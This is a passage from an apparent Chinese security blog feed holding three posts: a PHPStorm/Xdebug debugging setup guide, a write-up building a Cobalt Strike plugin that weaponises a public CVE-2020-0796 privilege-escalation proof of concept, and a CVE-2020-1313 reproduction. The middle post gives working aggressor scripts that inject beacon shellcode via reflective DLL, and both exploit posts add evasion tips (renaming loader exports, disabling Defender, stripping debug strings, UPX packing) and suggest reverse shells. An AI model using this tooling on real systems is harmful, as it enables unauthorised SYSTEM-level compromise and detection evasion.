src="https://i.loli.net/2021/07/27/iWhKrUnZj4LIpO1.png"><br>接下来配置部署服务器，部署就是需要将本地文件上传到远程服务器，就是上传到FTP中：<br><img src="https://i.loli.net/2021/07/27/FOWSUtxLeRA7cwa.png"><br>到这里添加一个FTP服务的连接即可，根路径就是FTP的根路径：<br><img src="https://i.loli.net/2021/07/27/OMBDF42Q7GgVdAv.png"><br>然后在配置映射，即为本地要传到远程的路径：<br><img src="https://i.loli.net/2021/07/27/5zOj1GNBFAwQxSb.png"><br>配置好后点击验证，这一步已经配置好文件同步和远程调试功能了：<br><img src="https://i.loli.net/2021/07/27/ZAOsvQViPlwJyMg.png"><br>由于我们需要实时修改文件，所以在&lt;执行前&gt;这个选项中配置一下同步，选择将文件上传到远程主机，配置下要上传的路径即可：<br><img src="https://i.loli.net/2021/07/27/HEQ6A8JcxwBDYsV.png"></p><p><strong>PHP Web页面</strong><br>这里主要是为了在浏览器中显示执行效果，配置本地浏览器要访问远程URL，触发PHP执行，在菜单运行-编辑配置-PHPWeb页面添加：<br><img src="https://i.loli.net/2021/07/27/SaYoXVqCcUlbgn9.png"><br>配置好远程服务器(文件-设置-PHP-服务器):<br><img src="https://i.loli.net/2021/07/27/oiuvHpkYnAKRf2N.png"><br>配置完成后，可以尝试调试查看效果，选择调试，这里先试试Web页面的，选择了Web的配置，点击Run后，打开了浏览器，并成功命中断点，输出<code>$_SERVER</code>信息，这里的Run每次都会打开浏览器访问URL输出，所以打开窗口后刷新页面即可不用再点Run：<br><img src="https://i.loli.net/2021/07/27/rUveWN3PMyo5ucR.png"><br>打开了浏览器后，就可以选择远程调试的配置了，点击调试按钮：<br><img src="https://i.loli.net/2021/07/27/tZAwMuxzalgUQI6.png"><br>刷新刚才的浏览器页面，命中断点：<br><img src="https://i.loli.net/2021/07/27/wlT2YbmiSLjQI9f.png"><br>如果对文件进行了更新，需要再次点击Debug按钮,对传入参数进行调试:<br><img src="https://i.loli.net/2021/07/27/TwAmpSn96PjxBOW.png"><br>到这里远程调试的环境就配置好了。</p><h2 id="0x03-本地调试配置"><a href="#0x03-本地调试配置" class="headerlink" title="0x03 本地调试配置"></a>0x03 本地调试配置</h2><p>本地调试的效果是可以在PHPStorm中运行、调试脚本，也可以配合浏览器运行、调试，参考上面远程调试的配置，开启PHPstudy的Xdebug配置，然后配置好PHPStorm。</p><h3 id="PHPStorm调试配置"><a href="#PHPStorm调试配置" class="headerlink" title="PHPStorm调试配置"></a>PHPStorm调试配置</h3><p>这里的配置是为了在PHPStorm里运行脚本，在运行-编辑配置-PHP脚本中配置好项目入口文件，php解释器二进制文件的位置即可：<br><img src="https://i.loli.net/2021/07/27/R47yMHgfiXGkZtY.png"><br>执行和调试效果都会在PHPStorm中输出：<br><img src="https://i.loli.net/2021/07/27/5CkyU7NPgYa4jrL.png"></p><h3 id="浏览器插件调试"><a href="#浏览器插件调试" class="headerlink" title="浏览器插件调试"></a>浏览器插件调试</h3><p>在浏览器中使用Xdebug helper插件和 PHPStorm进行调试，这里要设置PHPStorm调试的监听端口，PHPStorm的服务器配置，Xdebug helper的Cookie。<br>1.PHPStorm中调试端口配置(文件-设置-调试)<br><img src="https://i.loli.net/2021/07/27/FYLzdEhJGbqcReD.png"><br>这里注意端口会被php-cgi占用，所以把phpstorm监听的端口改成了9100：<br><img src="https://i.loli.net/2021/07/27/zluYXmLJN2qBsh5.png"><br>相应的在php配置文件也进行了更新：<br><img src="https://i.loli.net/2021/07/27/Bv9K6m2PMxUoHzw.png"></p><p>2.PHPStorm服务器配置(文件-设置-服务器):<br>配置好本地服务器的路径即可<br><img src="https://i.loli.net/2021/07/27/Yu31fFp5mo8I7a6.png"></p><p>3.Xdebug helper插件配置<br>到谷歌商店下载Xdebug helper<br><img src="https://i.loli.net/2021/07/27/GMYcTst6iAvCqQE.png"><br>设置Xdebug helper的PhpStorm Cookie(插件显示在扩展栏上，右键选项):<br><img src="https://i.loli.net/2021/07/27/r3BtNYqCleHgK1i.png"><br>访问可以看到Cookie：<br><img src="https://i.loli.net/2021/07/27/153C8vfejSTIhzW.png"><br>在代码中设置设置断点，刷新浏览器即可看到调试效果：<br><img src="https://i.loli.net/2021/07/27/quBQUjZ1Lclpxgf.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对PHP的调试配置，熟悉了PHPStorm和PHPStudy的配置，并成功实现了本地和远程两种调试的配置方法，一般来说在代码安全的情况下，选择本地调试方案比较方便。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPStorm调试 </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike插件之CVE-2020-0796提权脚本开发</title>
      <link href="/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/"/>
      <url>/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2020-0796(Windows SMBv3 Client/Server Remote Code Execution Vulnerability)是在SMB v3协议中存在的内存破坏漏洞，可用于远程RCE或本地提权。本文主要是利用已公开<a href="https://github.com/danigargu/CVE-2020-0796">本地提权POC</a>编写Cobalt Strike的提权插件, 用到了反射DLL的方法，具体可以在<a href="https://www.cobaltstrike.com/aggressor-script/functions.html">开发文档</a>中搜索<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDll</a>。<br>影响版本：<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for 32-bit Systems<br>修补方式：<br>1.安装更新<br>2.Powershell命令禁用压缩功能</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression <span class="token operator">-</span><span class="token function">Type</span> DWORD <span class="token operator">-</span>Value 1 <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x01-项目构建"><a href="#0x01-项目构建" class="headerlink" title="0x01 项目构建"></a>0x01 项目构建</h2><p>首先将ReflectiveDll项目复制到本地，然后将Poc代码<del>抄</del>整合到项目中(编写过程中会报很多错误，需要慢慢根据报错来修改)：<br><img src="https://i.loli.net/2021/04/21/CjV9hBlpDIR3bov.png"><br>修改入口函数,传递参数:<br><img src="https://i.loli.net/2021/04/21/ulTPmw98fxoicep.png"><br>如果不出意外没有报错后，就开始进行编译设置，选择Release x64，使用多字节字符集:<br><img src="https://i.loli.net/2021/04/21/VLoalXHCx9pDtfj.png"><br>代码生成-运行库选择多线程DLL(/MD)或多线程(/MT):<br><img src="https://i.loli.net/2021/04/21/oWbBnT21Xew9YCE.png"><br>关闭pdb的输出：<br><img src="https://i.loli.net/2021/04/21/EbrfyUDex1GqvcN.png"><br>然后就可以进行编译，成功编译后会输出DLL文件：<br><img src="https://i.loli.net/2021/04/22/VjilL6qYImODM7Z.png"><br>测试好的源码地址：<a href="https://github.com/yanghaoi/Cobalt_Strike_CNA/tree/main/CVE-2020-0796_CNA">github~</a></p><h2 id="0x02-CNA脚本编写"><a href="#0x02-CNA脚本编写" class="headerlink" title="0x02 CNA脚本编写"></a>0x02 CNA脚本编写</h2><p>CNA脚本是Cobalt Strike的插件脚本，用来给beacon下发各种指令增强Cobalt Strike的能力。<br>编写好的脚本如下，会将提权函数注册到beacon右键菜单-执行-提权中。函数会将上一步编译好的DLL反射进内存，然后传递shellcode执行：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span>    <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager $arch $dll'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" via CVE-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#KB4551762</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$arch</span> <span class="token operator">=</span> <span class="token string">"x64"</span><span class="token punctuation">;</span>        <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"0796.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$stager</span> <span class="token operator">=</span> transform<span class="token punctuation">(</span>shellcode<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">,</span> false<span class="token punctuation">,</span> <span class="token variable">$arch</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$dll</span><span class="token punctuation">,</span><span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"Elevation of local privileges"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-提权测试"><a href="#0x03-提权测试" class="headerlink" title="0x03 提权测试"></a>0x03 提权测试</h2><p>测试之前需要做一下环境的准备工作，先到<a href="https://msdn.itellyou.cn/">MSDN itellyou</a>上下载一个<a href="ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|9BCD5FA6C8009E4D0260E4B23008BD47|/">1909的镜像</a>，在虚拟机中安装好后，进行以下设置：</p><ol><li>暂停Windows更新(很关键,自动更新虚拟机占用20%CPU,顺便还把漏洞修了…)</li><li>关闭windows Defender</li><li>添加一个普通用户(net user admin 123 /add)</li><li>完成后保存快照<br><img src="https://i.loli.net/2021/04/22/lqBr4pvfJaLSTR1.png"><br>切换到admin下，随便传个🐴上去执行：<br><img src="https://i.loli.net/2021/04/22/tO9Rb1ckAvru8yz.png"><br>成功提权到SYSTEM:<br><img src="https://i.loli.net/2021/04/22/xOUELmuWTSCyeBs.gif" alt="CVE-2020-0796-LPE"></li></ol><h2 id="0x04-提权原理"><a href="#0x04-提权原理" class="headerlink" title="0x04 提权原理"></a>0x04 提权原理</h2><p>利用漏洞整数溢出(1108*A)，覆盖返回地址指向_SEP_TOKEN_PRIVILEGES结构体，然后通过任意写更改token权限：<br><img src="https://i.loli.net/2021/04/22/uFHX5lao1ULgQ3I.png"><br>之后找到一个高权限进程进行shellcode注入，获取权限。</p><h2 id="0x05-问题整理"><a href="#0x05-问题整理" class="headerlink" title="0x05 问题整理"></a>0x05 问题整理</h2><ol><li>Shellcode大小计算<br>CNA脚本在利用反射DLL提权时，会给DLL传递shellcode参数，用的是这两个函数生成载荷：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#shellcode">shellcode</a>和<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#stager">stager</a>，4.1可以用<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#payload_local">payload_local</a>。</li></ol><pre class="line-numbers language-shell"><code class="language-shell">$data = shellcode("my listener", false, "x64");$data = stager("my listener", "x64");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在DLL代码中，拿到该shellcode后，会进行长度计算，然后分配内存写入。而对传入的shellcode进行计算无非两种方法，单目运算符sizeof()和函数strlen(const char* str)，在进行shellcode计算时会遇到00字节导致计算错误，导致注入的系统进程(如winlogo.exe)崩溃，造成系统注销或重启。实验通过以下几种方案来尝试获得shellcode大小：<br>方案1(失败):<br>先看这第一种直接传入shellcode二进制流的方法：<br>使用<code>$stager = shellcode($2, false, $arch);</code>来生成shellcode：<br><img src="https://i.loli.net/2021/04/22/Rpi7bPoetvjBrkY.png"><br>可以正常获取到shellcode，但是没有办法计算分配的内存大小。<br>方案2(成功)：<br>方案2是开发的插件采用的方法，在方案1中无论如何都无法获得正确的shellcode内存大小，这时想到之前利用http加载shellcode执行的方法，在程序中会接收字符串(ascll)形式的shellcode，然后再转为hex形式的c-shellcode进入内存执行。<br>如下的示例,只有第二组的shellcode进入内存才会被正确执行：<br><img src="https://i.loli.net/2021/04/22/ZmkRoY1fTpWL5K6.png"><br>方案1问题在于无法获得正确的shellcode长度，方案2那么就先让它获取长度，而传入字符串可以使用strlen来获取长度，所以使用<code>$stager = transform(shellcode($2, false, $arch),"hex");</code>来转换shellcode为hex编码的字符串：<br><img src="https://i.loli.net/2021/04/22/EK5f1znFp4ky3IR.png"><br> 现在长度获取到了，就需要将字符串的shellcode转换成c-shellcode进内存执行，进行转换的代码：<br> <img src="https://i.loli.net/2021/04/22/Sd2vbzxgWjsDaYC.png"><br> 经过转换后，可以发现出现了熟悉的“麳冧痂”，剩下的就是按照漏洞利用流程在进程内存开辟891的空间，然后写入shellcode了：<br> <img src="https://i.loli.net/2021/04/22/x479DlbpJzjoHRK.png"><br> 方案3(成功)：<br> 在前两个方案中，要么就是无法获取长度，要么就是得转换shellcode，为什么不能在cna脚本里传递参数的时候就把长度给DLL呢。这里可以看下metasploit-framework的实现方法(专业!)，安装了metasploit后可以在<code>metasploit-framework\embedded\framework\external\source\exploits\CVE-2020-0796</code>下查看到源码：<br> <img src="https://i.loli.net/2021/04/22/xwBRMyazk8v6hEZ.png"><br> metasploit是通过定义一个结构体，定义两种不同类型的参数：</p><pre class="line-numbers language-thrift"><code class="language-thrift"> typedef struct _MSF_PAYLOAD {    DWORD  dwSize;    CHAR  cPayloadData[];} MSF_PAYLOAD;typedef MSF_PAYLOAD* PMSF_PAYLOAD;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在cna脚本中传递过来的参数就为：</p><pre class="line-numbers language-shell"><code class="language-shell">$stager = shellcode($2, false, $arch);$stager = pack("I-", strlen($stager)) . $stager;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行结果可以看到正确获取大小和数据流：<br><img src="https://i.loli.net/2021/04/22/z5bvSsJoWVClycR.png"><br>更棒的是，metasploit的exp可以直接拿过来用，只需要编写cna脚本传递参数即可。<br><img src="https://i.loli.net/2021/04/22/Wsl15bqRNgyDaY3.png"></p><ol start="2"><li><p>导出函数名<br>在这里想尝试修改默认DLL的导出函数(去除特征ReflectiveLoader)：<br><img src="https://i.loli.net/2021/04/22/UsWv7omgKflXJEM.png"><br>修改完成后编译，使用dumpbin工具查看DLL导出函数：</p><pre class="line-numbers language-taggerscript"><code class="language-taggerscript">>"D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64\dumpbin.exe" /exports reflective_dll.x64.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/Us9ltDmnLVfobRN.png"><br>然后加载执行：<br><img src="https://i.loli.net/2021/04/22/wJx4LFIMBaWSm6p.png"><br>额….，那还是老实用ReflectiveLoader。</p></li><li><p>Beacon exit后进程崩溃<br><img src="https://i.loli.net/2021/04/22/COTzDYKIRbN6qwE.gif" alt="Exit"><br>考虑是shellcode的原因，就像在beacon.exe中退出一样，进程会直接退出，那么就需要一个可以创建线程的shellcode来实现分离。在手册中看到有一个shellcode生成函数：<br><img src="https://i.loli.net/2021/04/22/iRN86mYyxcl2hSf.png"><br>在cs4.0下报错，函数不存在:<br><img src="https://i.loli.net/2021/04/22/fjROk9tbyZwBFgQ.png"><br>使用cs4.1进行测试成功，exit后进程不崩溃：<br><img src="https://i.loli.net/2021/04/22/USb3cCIfxXF4Ta6.gif"><br>cna脚本如下：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#cs4.1</span><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span> <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     berror<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796 exploit is x64 only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     return<span class="token punctuation">;</span> <span class="token punctuation">}</span> println<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" cve-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> payload_local<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$2</span><span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">,</span> <span class="token string">"thread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"I-"</span><span class="token punctuation">,</span> strlen<span class="token punctuation">(</span><span class="token variable">$stager</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$stager</span><span class="token punctuation">;</span> <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> beacon_link<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$3</span><span class="token punctuation">[</span><span class="token string">'listener'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外在4.1中普通权限获取的beacon信息中Build号(影响18362和18363)实际测试并不准确:</p></li></ol><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#输出beacon信息</span><span class="token keyword">foreach</span> <span class="token variable">$key</span> => <span class="token variable">$value</span> <span class="token punctuation">(</span>binfo<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        println<span class="token punctuation">(</span><span class="token string">"$[15]key <span class="token variable">$value</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/DEsqGh5YbZoW24t.png"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://bbs.pediy.com/thread-262027.htm">https://bbs.pediy.com/thread-262027.htm</a><br><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a><br><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1313复现</title>
      <link href="/2020/10/09/cve-2020-1313-fu-xian/"/>
      <url>/2020/10/09/cve-2020-1313-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>CVE-ID:CVE-2020-1313</p><p>类型：本地提权</p><p>POC: <a href="https://github.com/irsl/CVE-2020-1313">https://github.com/irsl/CVE-2020-1313</a></p><p>原理：利用Windows Update Orchestrator Service (是一个DCOM服务9C695035-48D2-4229-8B73-4C70E756E519) 暴露的API方法无需认证来进行计划任务的设置，计划任务以SYSTEM权限执行，导致权限提升。</p><p>影响版本：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><h4 id="2-编译复现"><a href="#2-编译复现" class="headerlink" title="2. 编译复现"></a>2. 编译复现</h4><p> 拉取poc后直接编译成Debug版本后，在虚拟机中cmd执行发现没有反应，双击执行后报错(物理机正常执行，考虑是虚拟机中运行环境的原因):</p><p><img src="https://i.loli.net/2020/10/09/fChwuaHAze9I3xg.png" alt="缺失DLL"></p><p>搜索缺少的DLL后，看到文章(<a href="https://blog.csdn.net/so_geili/article/details/53009680">https://blog.csdn.net/so_geili/article/details/53009680</a> 和 <a href="https://www.cnblogs.com/xzabg/p/5875296.html),%E8%AF%B4%E6%98%AF%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E7%84%B6%E5%90%8Evs%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.cnblogs.com/xzabg/p/5875296.html),说是编译的原因，然后vs进行设置如下：</a></p><p><img src="https://i.loli.net/2020/10/09/V6KjMf8JYCZAUwr.png" alt="运行库设置"></p><p>在项目属性-C/C++-代码生成-运行库中将其设置为静态编译 /MTd ，编译成功后文件为849kb：<br><img src="https://i.loli.net/2020/10/09/koVfPg2RhBL9EYz.png" alt="执行"></p><p>随后放到虚拟机里执行成功，可以看到注册表中新增了一项，命令在之后的一段时间内会自动触发。<br>接下来试试将选项设置为 release，生成后大小13kb:<br><img src="https://i.loli.net/2020/10/09/BQ2uz8SaMoVWmC1.png" alt="release"><br>执行成功：<br><img src="https://i.loli.net/2020/10/09/1tIb6v3nMmXyxNU.png" alt="执行成功"><br>然后一段时间后会在C盘生成个命令执行的txt，实际利用可以用powershell等来执行其他反弹shell的操作~</p><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>在编译过程中，遇到运行库的问题，将网上看到的在这里记录一下。</p><h5 id="1-运行库设置"><a href="#1-运行库设置" class="headerlink" title="1.运行库设置"></a>1.运行库设置</h5><blockquote><p>多线程(/MT)、多线程调试(/MTd)、多线程DLL(/MD)、多线程调试DLL(/MDd)、单线程(/ML)、单线程调试(/MLd)，带D的是Debug模式，单线程运行时库选项/ML和/MLd在VS2003以后就取消了。<br>/MT 、 /MTd：<br>/MT和/MTd表示采用多线程CRT库的静态lib版本。该选项会在编译时将运行时库以静态lib的形式完全嵌入。该选项生成的可执行文件运行时不需要运行时库dll的参加，会获得轻微的性能提升，但最终生成的二进制代码因链入庞大的运行时库实现而变得非常臃肿。当某项目以静态链接库的形式嵌入到多个项目，则可能造成运行时库的内存管理有多份，最终将导致致命的“Invalid Address specified to RtlValidateHeap”问题。另外托管C++和CLI中不再支持/MT和/MTd选项。</p><p>/MD、/MDd：<br>/MD和/MDd表示采用多线程CRT库的动态dll版本，会使应用程序使用运行时库特定版本的多线程DLL。链接时将按照传统VC链接dll的方式将运行时库MSVCRxx.DLL的导入库MSVCRT.lib链接，在运行时要求安装了相应版本的VC运行时库可再发行组件包（当然把这些运行时库dll放在应用程序目录下也是可以的）。 因/MD和/MDd方式不会将运行时库链接到可执行文件内部，可有效减少可执行文件尺寸。当多项目以MD方式运作时，其内部会采用同一个堆，内存管理将被简化，跨模块内存管理问题也能得到缓解。</p></blockquote><h5 id="2-调试信息的隐藏"><a href="#2-调试信息的隐藏" class="headerlink" title="2.调试信息的隐藏"></a>2.调试信息的隐藏</h5><p>编译为可执行文件后，用16进制查看发现存在一些路径信息、printf的信息:<br><img src="https://i.loli.net/2020/10/09/xSUBOYdIzgMT7Xf.png" alt="路径信息"></p><p><img src="https://i.loli.net/2020/10/09/nbUVfdHhmwxWJpK.png" alt="printf的信息"></p><p>解决方法：<br>在属性链接器-调试中关闭调试信息：</p><p><img src="https://i.loli.net/2020/10/09/pHEgo97U3Xr4byD.png" alt="关闭调试信息生成"></p><p>然后捏，还可以用UPX 压缩一下文件 upx -9 xx.exe,从13kb压缩到9kb了。</p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.freebuf.com/vuls/245706.html">https://www.freebuf.com/vuls/245706.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> CVE-2020-1313 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的win提权</title>
      <link href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/"/>
      <url>/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</url>
      
